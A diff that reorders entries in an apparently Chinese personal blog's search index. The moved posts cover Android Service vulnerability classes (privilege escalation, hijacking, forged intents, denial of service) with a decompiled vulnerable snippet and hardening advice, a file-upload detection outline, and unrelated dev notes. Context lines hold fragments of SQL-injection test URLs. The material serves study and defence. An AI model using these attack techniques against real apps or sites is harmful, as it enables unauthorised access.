@@ -3412,80 +3412,6 @@ public ParcelFileDescriptor openFile(Uri paramUri,String paramString) throws Fil
       </tags>
   </entry>
   <entry>
-    <title>android Service漏洞挖掘</title>
-    <url>/post/3182197634.html</url>
-    <content><![CDATA[<h2 id="Service安全场景和危害"><a href="#Service安全场景和危害" class="headerlink" title="Service安全场景和危害"></a>Service安全场景和危害</h2><pre><code>Service是android四大组件之一，一个Service是没有界面且能长时间运行于后台的应用组件。其他应用的组件可以启动一个服务运行于后台，即使用户切换到另一个应用也会继续运行。另外，一个组件可以绑定到一个service来进行交互，即使这个交互是进程间通讯也没问题。例如，一个service可能处理网络事物，播放音乐，执行文件I/O，或与一个内容提供者交互，所有这些都在后台进行。Service不是分离开的进程，除非其他特殊情况，他不会运行在自己的进程，而是作为启动运行它的进程的一部分。Service不是线程，这意味着它将在主线程里劳作。  
-
-如果一个导出的Service没有做严格的限制，任何应用可以去启动并且绑定到这个Service上，取决于被暴露的功能，这有可能使得一个应用去执行未授权的行为，获取敏感信息或者是污染修改内部应用的状态造成威胁。  
-</code></pre><h2 id="Service漏洞分类"><a href="#Service漏洞分类" class="headerlink" title="Service漏洞分类"></a>Service漏洞分类</h2><ul>
-<li>权限提升</li>
-<li>services劫持</li>
-<li>消息伪造</li>
-<li>拒绝服务</li>
-</ul>
-<h2 id="权限提升漏洞"><a href="#权限提升漏洞" class="headerlink" title="权限提升漏洞"></a>权限提升漏洞</h2><pre><code>当一个service配置了intent-filter默认是被导出的，如果没对调用这个Service进行权限限制或者是没有对调用者的身份进行有效的验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意的行为发生比如说调用具有system权限的删除卸载服务删除卸载其他应用。
-</code></pre><h2 id="service劫持"><a href="#service劫持" class="headerlink" title="service劫持"></a>service劫持</h2><pre><code>攻击原理：隐式启动service，当存在同名service，先安装应用的service优先级高。  
-</code></pre><h2 id="消息伪造"><a href="#消息伪造" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>暴露的Service对外接收Intent，如果构造恶意的消息放到Intent中传输，被调用的Service接收有可能产生安全隐患。  
-
-如：指定升级下载的URL地址，可导致任意应用安装！  
-</code></pre><h2 id="消息伪造-1"><a href="#消息伪造-1" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>protected void onHandleIntent(Intent intent){
-    Intent v0;
-    String v23;
-    Serializable pushMsg=intent.getSerializableExtra(&quot;PushMsg&quot;);
-    ...
-    AppVersionManager.getInstance(Youku.context).showAPpAgreementDialog();
-
-    switch(pushMsg.type){
-        case 1:{
-            goto label_53;
-
-        }
-    }
-}
-
-label_53:
-    intent.setFlags(876609536);
-    intent.setClass(this,UpdateActivity.class);
-    intent.putExtra(&quot;updateurl&quot;,pushMsg.updateurl);
-    intent.putExtra(&quot;updateversion&quot;,pushMsg.updateversion);
-    intent.putExtra(&quot;updatecontent&quot;,pushMsg.updatecontent);
-    intent.putExtra(&quot;updateType&quot;,2);
-    this.startActivity(intent);
-    return;
-</code></pre><h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><pre><code>Service的拒绝服务主要是来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致的程序崩溃。主要体现的方面如给Service传输未null的intent或者是传输序列化对象导致接收时候的类型转化异常。  
-</code></pre><p>修复：<br>1.改成service exported false<br>2.删除多余测试代码，验证token</p>
-<h2 id="拒绝服务：防护"><a href="#拒绝服务：防护" class="headerlink" title="拒绝服务：防护"></a>拒绝服务：防护</h2><ul>
-<li>空指针异常</li>
-<li>类型转换异常</li>
-<li>数组越界访问异常</li>
-<li>类未定义异常</li>
-<li><p>其他异常</p>
-<p>  //Serializable:<br>  Intent i = this.getIntent();<br>  if(i.getAction().equals(“serializable_action”)){<br>  i.getSerializableExtra(“serializable_key”);//未做异常判断<br>  }<br>  //Parcelable:<br>  this.b=(RouterConfig)this.getIntent().getParcelableExtra(“filed_router_config”);//引发转型异常崩溃</p>
-<p>  谨慎处理接收的intent以及其携带的信息。<br>  对接收到的任何数据try catch处理，以及对不符合预期的数据做异常处理。  </p>
-</li>
-</ul>
-<h2 id="Service安全防护"><a href="#Service安全防护" class="headerlink" title="Service安全防护"></a>Service安全防护</h2><ul>
-<li>私有service不定义intent-filter并且设置exported为false。</li>
-<li>公开的service设置exported为true，intent-filter可以定义或者不定义。</li>
-<li>合作service需对合作方的app签名做校验。</li>
-<li>只被应用本身使用的service应设置为私有。</li>
-<li>service接收到的数据需谨慎处理。</li>
-<li>内部service需使用签名级别的protectionLevel来判断是否为内部应用调用。</li>
-<li>不应在service创建(onCreate方法被调用)的时候决定是否提供服务,应在onStartCommand/onBind/onHandleIntent等方法被调用的时候做判断。</li>
-<li>当service又返回数据的时候，因判断数据接收app是否又信息泄露的风险。</li>
-<li>有明确的服务需调用时使用显示意图。</li>
-<li>尽量不发送敏感信息。</li>
-<li>启动Activity时不设置intent的FLAG_ACTIVITY_NEW_TASK标签。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>android安全</category>
-      </categories>
-      <tags>
-        <tag>anroid安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>android Activity漏洞挖掘</title>
     <url>/post/2470166639.html</url>
     <content><![CDATA[<h2 id="越权绕过漏洞"><a href="#越权绕过漏洞" class="headerlink" title="越权绕过漏洞"></a>越权绕过漏洞</h2><p>在Android系统中，Activity默认是不导出的，如果设置了 <code>exported=&quot;true&quot;</code> 这样的关键值或者是添加了<code>&lt;intent-filter&gt;</code>这样的属性，并且没有显示的设置为<code>exported=&quot;false&quot;</code>,那么此时Activity是导出的，如果Activity被不合理的导出，那么就会有越权绕过或者是泄漏敏感信息等安全风险，比如在业务过程中会有一些敏感的界面是需要用户输入密码才能查看的，但是如果没有对调起此activity的组件进行权限验证，那么就会造成验证的越权问题，导致恶意的攻击者不需要输入密码等信息也可以打开这个界面。还有通过Intent给Activity传输畸形数据使得程序崩溃拒绝服务影响用户体验或Activity界面被劫持产生欺诈等安全事件。  </p>
@@ -3574,6 +3500,80 @@ this.b=(RouterConfig)this.getIntent().getParcelableExtra(&quot;filed_router_conf
       </categories>
       <tags>
         <tag>android安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android Service漏洞挖掘</title>
+    <url>/post/3182197634.html</url>
+    <content><![CDATA[<h2 id="Service安全场景和危害"><a href="#Service安全场景和危害" class="headerlink" title="Service安全场景和危害"></a>Service安全场景和危害</h2><pre><code>Service是android四大组件之一，一个Service是没有界面且能长时间运行于后台的应用组件。其他应用的组件可以启动一个服务运行于后台，即使用户切换到另一个应用也会继续运行。另外，一个组件可以绑定到一个service来进行交互，即使这个交互是进程间通讯也没问题。例如，一个service可能处理网络事物，播放音乐，执行文件I/O，或与一个内容提供者交互，所有这些都在后台进行。Service不是分离开的进程，除非其他特殊情况，他不会运行在自己的进程，而是作为启动运行它的进程的一部分。Service不是线程，这意味着它将在主线程里劳作。  
+
+如果一个导出的Service没有做严格的限制，任何应用可以去启动并且绑定到这个Service上，取决于被暴露的功能，这有可能使得一个应用去执行未授权的行为，获取敏感信息或者是污染修改内部应用的状态造成威胁。  
+</code></pre><h2 id="Service漏洞分类"><a href="#Service漏洞分类" class="headerlink" title="Service漏洞分类"></a>Service漏洞分类</h2><ul>
+<li>权限提升</li>
+<li>services劫持</li>
+<li>消息伪造</li>
+<li>拒绝服务</li>
+</ul>
+<h2 id="权限提升漏洞"><a href="#权限提升漏洞" class="headerlink" title="权限提升漏洞"></a>权限提升漏洞</h2><pre><code>当一个service配置了intent-filter默认是被导出的，如果没对调用这个Service进行权限限制或者是没有对调用者的身份进行有效的验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意的行为发生比如说调用具有system权限的删除卸载服务删除卸载其他应用。
+</code></pre><h2 id="service劫持"><a href="#service劫持" class="headerlink" title="service劫持"></a>service劫持</h2><pre><code>攻击原理：隐式启动service，当存在同名service，先安装应用的service优先级高。  
+</code></pre><h2 id="消息伪造"><a href="#消息伪造" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>暴露的Service对外接收Intent，如果构造恶意的消息放到Intent中传输，被调用的Service接收有可能产生安全隐患。  
+
+如：指定升级下载的URL地址，可导致任意应用安装！  
+</code></pre><h2 id="消息伪造-1"><a href="#消息伪造-1" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>protected void onHandleIntent(Intent intent){
+    Intent v0;
+    String v23;
+    Serializable pushMsg=intent.getSerializableExtra(&quot;PushMsg&quot;);
+    ...
+    AppVersionManager.getInstance(Youku.context).showAPpAgreementDialog();
+
+    switch(pushMsg.type){
+        case 1:{
+            goto label_53;
+
+        }
+    }
+}
+
+label_53:
+    intent.setFlags(876609536);
+    intent.setClass(this,UpdateActivity.class);
+    intent.putExtra(&quot;updateurl&quot;,pushMsg.updateurl);
+    intent.putExtra(&quot;updateversion&quot;,pushMsg.updateversion);
+    intent.putExtra(&quot;updatecontent&quot;,pushMsg.updatecontent);
+    intent.putExtra(&quot;updateType&quot;,2);
+    this.startActivity(intent);
+    return;
+</code></pre><h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><pre><code>Service的拒绝服务主要是来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致的程序崩溃。主要体现的方面如给Service传输未null的intent或者是传输序列化对象导致接收时候的类型转化异常。  
+</code></pre><p>修复：<br>1.改成service exported false<br>2.删除多余测试代码，验证token</p>
+<h2 id="拒绝服务：防护"><a href="#拒绝服务：防护" class="headerlink" title="拒绝服务：防护"></a>拒绝服务：防护</h2><ul>
+<li>空指针异常</li>
+<li>类型转换异常</li>
+<li>数组越界访问异常</li>
+<li>类未定义异常</li>
+<li><p>其他异常</p>
+<p>  //Serializable:<br>  Intent i = this.getIntent();<br>  if(i.getAction().equals(“serializable_action”)){<br>  i.getSerializableExtra(“serializable_key”);//未做异常判断<br>  }<br>  //Parcelable:<br>  this.b=(RouterConfig)this.getIntent().getParcelableExtra(“filed_router_config”);//引发转型异常崩溃</p>
+<p>  谨慎处理接收的intent以及其携带的信息。<br>  对接收到的任何数据try catch处理，以及对不符合预期的数据做异常处理。  </p>
+</li>
+</ul>
+<h2 id="Service安全防护"><a href="#Service安全防护" class="headerlink" title="Service安全防护"></a>Service安全防护</h2><ul>
+<li>私有service不定义intent-filter并且设置exported为false。</li>
+<li>公开的service设置exported为true，intent-filter可以定义或者不定义。</li>
+<li>合作service需对合作方的app签名做校验。</li>
+<li>只被应用本身使用的service应设置为私有。</li>
+<li>service接收到的数据需谨慎处理。</li>
+<li>内部service需使用签名级别的protectionLevel来判断是否为内部应用调用。</li>
+<li>不应在service创建(onCreate方法被调用)的时候决定是否提供服务,应在onStartCommand/onBind/onHandleIntent等方法被调用的时候做判断。</li>
+<li>当service又返回数据的时候，因判断数据接收app是否又信息泄露的风险。</li>
+<li>有明确的服务需调用时使用显示意图。</li>
+<li>尽量不发送敏感信息。</li>
+<li>启动Activity时不设置intent的FLAG_ACTIVITY_NEW_TASK标签。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>android安全</category>
+      </categories>
+      <tags>
+        <tag>anroid安全</tag>
       </tags>
   </entry>
   <entry>
@@ -5572,6 +5572,32 @@ failed on &#39;/sdcard/busybox&#39; - Cross-device link
       </tags>
   </entry>
   <entry>
+    <title>android_No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android</title>
+    <url>/post/3707592036.html</url>
+    <content><![CDATA[<p>主要是缺少这个文件 mips64el-linux-android<br>同理一些相同NDK目录可能也是缺少某些文件  </p>
+<pre><code>ndk目录
+/Users/shaomiao/Library/Android/sdk/ndk-bundle
+</code></pre><p>1.打开项目local.properties文件</p>
+<pre><code>Project/local.properties
+
+ndk.dir
+</code></pre><p>2.打开ndk.dir文件夹</p>
+<p>3.下载对应的ndk  </p>
+<p><a href="https://developer.android.com/ndk/downloads/?hl=zh-cn" target="_blank" rel="noopener">ndk下载</a>  </p>
+<p>4.打开toolchains文件夹  </p>
+<p>5.从下载的ndk目录中toolchains/mips64el-linux-android-4.9 复制到 项目ndk-bundle/toolchains目录里</p>
+<p>6.make project</p>
+<pre><code>build/Make Project
+</code></pre><h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/qq_24118527/article/details/82867864" target="_blank" rel="noopener">完美解决 No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android</a>  </p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>android里layout.xml的include</title>
     <url>/post/2155240333.html</url>
     <content><![CDATA[<pre><code>include 两个一样的layout
@@ -5653,32 +5679,6 @@ item2_tv4.setText(&quot;64-23&quot;);
 item2_tv5.setText(&quot;进球-失球&quot;);
 item2_tv6.setText(&quot;1连胜中&quot;);
 </code></pre>]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android_No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android</title>
-    <url>/post/3707592036.html</url>
-    <content><![CDATA[<p>主要是缺少这个文件 mips64el-linux-android<br>同理一些相同NDK目录可能也是缺少某些文件  </p>
-<pre><code>ndk目录
-/Users/shaomiao/Library/Android/sdk/ndk-bundle
-</code></pre><p>1.打开项目local.properties文件</p>
-<pre><code>Project/local.properties
-
-ndk.dir
-</code></pre><p>2.打开ndk.dir文件夹</p>
-<p>3.下载对应的ndk  </p>
-<p><a href="https://developer.android.com/ndk/downloads/?hl=zh-cn" target="_blank" rel="noopener">ndk下载</a>  </p>
-<p>4.打开toolchains文件夹  </p>
-<p>5.从下载的ndk目录中toolchains/mips64el-linux-android-4.9 复制到 项目ndk-bundle/toolchains目录里</p>
-<p>6.make project</p>
-<pre><code>build/Make Project
-</code></pre><h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/qq_24118527/article/details/82867864" target="_blank" rel="noopener">完美解决 No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android</a>  </p>
-]]></content>
       <categories>
         <category>android</category>
       </categories>
@@ -7189,18 +7189,6 @@ pip install request
       </tags>
   </entry>
   <entry>
-    <title>SSL和HTTPS</title>
-    <url>/post/902500137.html</url>
-    <content><![CDATA[<h2 id="SSL和HTTPS"><a href="#SSL和HTTPS" class="headerlink" title="SSL和HTTPS"></a>SSL和HTTPS</h2><p>加密技术只能保护你的会话所使用的信道。它保护通信不被窃听，甚至能够让你更加肯定正在交谈的两台计算机的身份，而我们所测试的是在通信末端的软件的行为。<br>HTTP和HTTPS之间唯一的区别在于HTTPS连接在初始化有额外的设置。它建立起一条安全信道，然后通过这条安全信道来发送标准的HTTP。你将会看到，测试HTTPS应用时，通常你需要做的唯一不同的事情就是在运行工具时额外增加一个命令行参数或配置选项。者对测试的影响确实不大。</p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>tips</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>URL中的大小写敏感</title>
     <url>/post/1353455041.html</url>
     <content><![CDATA[<h2 id="URL中的大小写敏感"><a href="#URL中的大小写敏感" class="headerlink" title="URL中的大小写敏感"></a>URL中的大小写敏感</h2><pre><code>http://fred:wilma@www.example.com/private.asp?doc=3&amp;part=4#footer
@@ -7214,6 +7202,18 @@ pip install request
 <li><p>获取资源情况 （private.asp） ASP是Windows动态服务器扩展名 Windows服务器都不是大小写敏感的，因此/PRIvate.aSP可能也有效  </p>
 </li>
 </ol>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>tips</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSL和HTTPS</title>
+    <url>/post/902500137.html</url>
+    <content><![CDATA[<h2 id="SSL和HTTPS"><a href="#SSL和HTTPS" class="headerlink" title="SSL和HTTPS"></a>SSL和HTTPS</h2><p>加密技术只能保护你的会话所使用的信道。它保护通信不被窃听，甚至能够让你更加肯定正在交谈的两台计算机的身份，而我们所测试的是在通信末端的软件的行为。<br>HTTP和HTTPS之间唯一的区别在于HTTPS连接在初始化有额外的设置。它建立起一条安全信道，然后通过这条安全信道来发送标准的HTTP。你将会看到，测试HTTPS应用时，通常你需要做的唯一不同的事情就是在运行工具时额外增加一个命令行参数或配置选项。者对测试的影响确实不大。</p>
 ]]></content>
       <categories>
         <category>web安全</category>
@@ -9480,6 +9480,28 @@ git merge version1.0
       </tags>
   </entry>
   <entry>
+    <title>mac_终端用sublime打开文件</title>
+    <url>/post/576883658.html</url>
+    <content><![CDATA[<p><strong>打开文件</strong></p>
+<pre><code>vi ~/.bash_profile
+</code></pre><p><strong>添加命令</strong></p>
+<pre><code>alias subl=\&#39;&#39;/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl&#39;\&#39;
+</code></pre><p><strong>启动</strong></p>
+<pre><code>source ~/.bash_profile 
+</code></pre><p><strong>使用命令</strong></p>
+<pre><code>subl 文件/目录
+
+subl ./_posts/2018-08-03-mac_sublime_open_file.md
+</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u011240016/article/details/54434923" target="_blank" rel="noopener">终端用sublime打开文件的方法</a></p>
+]]></content>
+      <categories>
+        <category>macos</category>
+      </categories>
+      <tags>
+        <tag>macos</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF入门如何学习</title>
     <url>/post/3004991132.html</url>
     <content><![CDATA[<p>这是看了i春秋课程的学习笔记<br><a href="https://www.ichunqiu.com/course/57515" target="_blank" rel="noopener">CTF入门如何学习</a></p>
@@ -9561,38 +9583,21 @@ XCTF总决赛
       </tags>
   </entry>
   <entry>
-    <title>mac_终端用sublime打开文件</title>
-    <url>/post/576883658.html</url>
-    <content><![CDATA[<p><strong>打开文件</strong></p>
-<pre><code>vi ~/.bash_profile
-</code></pre><p><strong>添加命令</strong></p>
-<pre><code>alias subl=\&#39;&#39;/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl&#39;\&#39;
-</code></pre><p><strong>启动</strong></p>
-<pre><code>source ~/.bash_profile 
-</code></pre><p><strong>使用命令</strong></p>
-<pre><code>subl 文件/目录
-
-subl ./_posts/2018-08-03-mac_sublime_open_file.md
-</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u011240016/article/details/54434923" target="_blank" rel="noopener">终端用sublime打开文件的方法</a></p>
+    <title>2.1.1-文件上传流动原理与流程-上传检测流程</title>
+    <url>/post/2419343777.html</url>
+    <content><![CDATA[<h2 id="文件上传检测流程"><a href="#文件上传检测流程" class="headerlink" title="文件上传检测流程"></a>文件上传检测流程</h2><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/15/01.png" alt="文件上传检测流程"></p>
+<p><strong>前端提交：</strong><br>javaScript检测、Flash AS检测<br>app：java代码检测  </p>
+<p><strong>数据传输：</strong><br>形成的报文到后端处理 -&gt; 会存在WAF拦截、IPS入侵防御拦截  </p>
+<p><strong>后端处理：</strong><br>文件扩展名检测、MIME TYPE检测（报文文件参数content type）、文件格式检测、内容检测（检测恶意代码）  </p>
+<p><strong>写入文件系统：</strong><br>文件重命名、强制改变后缀名为jpg、杀毒软件查杀（隔离区或删除、00截断） </p>
+<p><strong>访问文件：</strong><br>无执行权限（直接返回文件内容）、未知位置（根据特殊名或id读取文件）  </p>
 ]]></content>
       <categories>
-        <category>macos</category>
+        <category>web安全</category>
       </categories>
       <tags>
-        <tag>macos</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>blog链接</title>
-    <url>/post/1065774692.html</url>
-    <content><![CDATA[<p><a href="https://www.wikimoe.com/" target="_blank" rel="noopener">wikimoe_live2d</a><br><a href="https://qqdie.com/archives/l2d233.html" target="_blank" rel="noopener">Live2D看板娘来了！typecho插件</a><br><a href="https://imjad.cn/archives/lab/add-dynamic-poster-girl-with-live2d-to-your-blog-02" target="_blank" rel="noopener">给博客添加能动的看板娘(Live2D)-将其添加到网页上吧</a><br><a href="https://www.wikimoe.com/?post=75" target="_blank" rel="noopener">emlog插件版之给博客加上能陪聊的Live2d版伊斯特瓦尔【ver1.04】</a><br><a href="https://www.wikimoe.com/?post=76" target="_blank" rel="noopener">博客通用版Live2d伊斯特瓦尔发布</a>  </p>
-<p><a href="https://xiaolin.in/read/hitokoto-api-xiaolin-edition.html" target="_blank" rel="noopener">一言</a>  </p>
-]]></content>
-      <categories>
-        <category>blog</category>
-      </categories>
-      <tags>
-        <tag>link</tag>
+        <tag>web安全</tag>
+        <tag>文件上传漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -9628,21 +9633,16 @@ remotes/origin/release
       </tags>
   </entry>
   <entry>
-    <title>2.1.1-文件上传流动原理与流程-上传检测流程</title>
-    <url>/post/2419343777.html</url>
-    <content><![CDATA[<h2 id="文件上传检测流程"><a href="#文件上传检测流程" class="headerlink" title="文件上传检测流程"></a>文件上传检测流程</h2><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/15/01.png" alt="文件上传检测流程"></p>
-<p><strong>前端提交：</strong><br>javaScript检测、Flash AS检测<br>app：java代码检测  </p>
-<p><strong>数据传输：</strong><br>形成的报文到后端处理 -&gt; 会存在WAF拦截、IPS入侵防御拦截  </p>
-<p><strong>后端处理：</strong><br>文件扩展名检测、MIME TYPE检测（报文文件参数content type）、文件格式检测、内容检测（检测恶意代码）  </p>
-<p><strong>写入文件系统：</strong><br>文件重命名、强制改变后缀名为jpg、杀毒软件查杀（隔离区或删除、00截断） </p>
-<p><strong>访问文件：</strong><br>无执行权限（直接返回文件内容）、未知位置（根据特殊名或id读取文件）  </p>
+    <title>blog链接</title>
+    <url>/post/1065774692.html</url>
+    <content><![CDATA[<p><a href="https://www.wikimoe.com/" target="_blank" rel="noopener">wikimoe_live2d</a><br><a href="https://qqdie.com/archives/l2d233.html" target="_blank" rel="noopener">Live2D看板娘来了！typecho插件</a><br><a href="https://imjad.cn/archives/lab/add-dynamic-poster-girl-with-live2d-to-your-blog-02" target="_blank" rel="noopener">给博客添加能动的看板娘(Live2D)-将其添加到网页上吧</a><br><a href="https://www.wikimoe.com/?post=75" target="_blank" rel="noopener">emlog插件版之给博客加上能陪聊的Live2d版伊斯特瓦尔【ver1.04】</a><br><a href="https://www.wikimoe.com/?post=76" target="_blank" rel="noopener">博客通用版Live2d伊斯特瓦尔发布</a>  </p>
+<p><a href="https://xiaolin.in/read/hitokoto-api-xiaolin-edition.html" target="_blank" rel="noopener">一言</a>  </p>
 ]]></content>
       <categories>
-        <category>web安全</category>
+        <category>blog</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
-        <tag>文件上传漏洞</tag>
+        <tag>link</tag>
       </tags>
   </entry>
   <entry>
@@ -9886,6 +9886,32 @@ sqlmap -u &quot;http://127.0.0.1/Less-1/double.php?id=1%2527&quot; --current--+
       </categories>
       <tags>
         <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>1.自制脚本语言-第一章笔记</title>
+    <url>/post/395714690.html</url>
+    <content><![CDATA[<p>这是一个读两周自制脚本语言的笔记，然后立flag，这个月打算看完  </p>
+<h1 id="day-1"><a href="#day-1" class="headerlink" title="day 1"></a>day 1</h1><h2 id="1-1-机器语言-amp-汇编语言"><a href="#1-1-机器语言-amp-汇编语言" class="headerlink" title="1.1 机器语言 &amp; 汇编语言"></a>1.1 机器语言 &amp; 汇编语言</h2><ul>
+<li><p>机器语言： 不需要借助软件执行，不需要语言处理器，可以由硬件直接解释执行 一个位数很长的二进制数字</p>
+</li>
+<li><p>汇编语言： 通过汇编语言程序表述巨大的数字，使其易于理解，需要通过软件转换成机器语言，这种软件称为汇编程序。汇编程序是一种最基本的语言处理器</p>
+</li>
+</ul>
+<h2 id="1-2-解释器-amp-编译器"><a href="#1-2-解释器-amp-编译器" class="headerlink" title="1.2 解释器 &amp; 编译器"></a>1.2 解释器 &amp; 编译器</h2><ul>
+<li><p>解释器： 根据程序中的算法执行运算，执行程序的软件<br>如果执行的程序由虚拟机语言或类似机器语言程序设计语言写成，这种软件也能称为虚拟机</p>
+</li>
+<li><p>编译器： 能将某种语言写成的程序转换为另一种语言的程序<br>编译器转换程序的行为称为编译，转换前的程序称为源代码或源程序。<br>如果编译器没有把源代码直接转换为机器语言，称为源代码转换器或源码转换器</p>
+</li>
+</ul>
+<h2 id="1-3-开发语言处理器"><a href="#1-3-开发语言处理器" class="headerlink" title="1.3 开发语言处理器"></a>1.3 开发语言处理器</h2><p>Stone语言 运行于 Java虚拟机</p>
+<h2 id="1-4-语言处理器的结构与本书的框架"><a href="#1-4-语言处理器的结构与本书的框架" class="headerlink" title="1.4 语言处理器的结构与本书的框架"></a>1.4 语言处理器的结构与本书的框架</h2><p>源代码首先将进行词法分析，由一长串字符串细分为多个更小的字符串单元。分割后的字符串称为单词。之后处理器将执行语法分析处理，把单词的排列转换为抽象语法树。 之后 编译器会把抽象语法树转换为其他语言，而解释器将会一边分析抽象语法树一边执行运算</p>
+]]></content>
+      <categories>
+        <category>脚本语言</category>
+      </categories>
+      <tags>
+        <tag>脚本语言</tag>
       </tags>
   </entry>
   <entry>
@@ -10184,32 +10210,6 @@ textview以此排列
       </tags>
   </entry>
   <entry>
-    <title>1.自制脚本语言-第一章笔记</title>
-    <url>/post/395714690.html</url>
-    <content><![CDATA[<p>这是一个读两周自制脚本语言的笔记，然后立flag，这个月打算看完  </p>
-<h1 id="day-1"><a href="#day-1" class="headerlink" title="day 1"></a>day 1</h1><h2 id="1-1-机器语言-amp-汇编语言"><a href="#1-1-机器语言-amp-汇编语言" class="headerlink" title="1.1 机器语言 &amp; 汇编语言"></a>1.1 机器语言 &amp; 汇编语言</h2><ul>
-<li><p>机器语言： 不需要借助软件执行，不需要语言处理器，可以由硬件直接解释执行 一个位数很长的二进制数字</p>
-</li>
-<li><p>汇编语言： 通过汇编语言程序表述巨大的数字，使其易于理解，需要通过软件转换成机器语言，这种软件称为汇编程序。汇编程序是一种最基本的语言处理器</p>
-</li>
-</ul>
-<h2 id="1-2-解释器-amp-编译器"><a href="#1-2-解释器-amp-编译器" class="headerlink" title="1.2 解释器 &amp; 编译器"></a>1.2 解释器 &amp; 编译器</h2><ul>
-<li><p>解释器： 根据程序中的算法执行运算，执行程序的软件<br>如果执行的程序由虚拟机语言或类似机器语言程序设计语言写成，这种软件也能称为虚拟机</p>
-</li>
-<li><p>编译器： 能将某种语言写成的程序转换为另一种语言的程序<br>编译器转换程序的行为称为编译，转换前的程序称为源代码或源程序。<br>如果编译器没有把源代码直接转换为机器语言，称为源代码转换器或源码转换器</p>
-</li>
-</ul>
-<h2 id="1-3-开发语言处理器"><a href="#1-3-开发语言处理器" class="headerlink" title="1.3 开发语言处理器"></a>1.3 开发语言处理器</h2><p>Stone语言 运行于 Java虚拟机</p>
-<h2 id="1-4-语言处理器的结构与本书的框架"><a href="#1-4-语言处理器的结构与本书的框架" class="headerlink" title="1.4 语言处理器的结构与本书的框架"></a>1.4 语言处理器的结构与本书的框架</h2><p>源代码首先将进行词法分析，由一长串字符串细分为多个更小的字符串单元。分割后的字符串称为单词。之后处理器将执行语法分析处理，把单词的排列转换为抽象语法树。 之后 编译器会把抽象语法树转换为其他语言，而解释器将会一边分析抽象语法树一边执行运算</p>
-]]></content>
-      <categories>
-        <category>脚本语言</category>
-      </categories>
-      <tags>
-        <tag>脚本语言</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>1.4.1-SQL注入防御绕过-宽字节注入</title>
     <url>/post/2024290485.html</url>
     <content><![CDATA[<h2 id="01-宽字节注入原理"><a href="#01-宽字节注入原理" class="headerlink" title="01 宽字节注入原理"></a>01 宽字节注入原理</h2><blockquote>
@@ -10411,53 +10411,6 @@ http://localhost:90/Less-10/?id=1&quot; and if(left(select table_name from infor
       </tags>
   </entry>
   <entry>
-    <title>android EventBus 使用</title>
-    <url>/post/3369655730.html</url>
-    <content><![CDATA[<p>2017 10 27<br>EventBus是什么？<br>首先有两个概念发布者/订阅者  </p>
-<p>发布者就是 发送事件<br>订阅者 就是接收事件  </p>
-<pre><code>gradle
-
-compile &#39;org.greenrobot:eventbus:3.0.0&#39;
-</code></pre><p>1.定义事件</p>
-<pre><code>
-// 定义事件 这个就是你要传送的数据实体类
-public static class MessageEvent { /* Additional fields if needed */ }
-</code></pre>
-
-
-<p>2.准备订阅者</p>
-<pre><code>
-@Subscribe(threadMode = ThreadMode.MAIN)  
-public void onMessageEvent(MessageEvent event) {/* Do something */};
-
-// 订阅者 接受数据的方法 threadMode  是运行在什么线程模式
-http://greenrobot.org/eventbus/documentation/delivery-threads-threadmode/
-</code></pre>
-
-<p>注册和取消注册订阅者</p>
-<pre><code> @Override
- public void onStart() {
-     super.onStart();
-     EventBus.getDefault().register(this);
- }
-
- @Override
- public void onStop() {
-     super.onStop();
-     EventBus.getDefault().unregister(this);
- }
-</code></pre><p>3.发送事件</p>
-<pre><code>`EventBus.getDefault().post(new MessageEvent());`
-</code></pre>]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-        <tag>eventbus</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>android 代码样式规范</title>
     <url>/post/208407023.html</url>
     <content><![CDATA[<p>原文地址 把重点记录下<br><a href="https://source.android.com/source/code-style.html" target="_blank" rel="noopener">https://source.android.com/source/code-style.html</a></p>
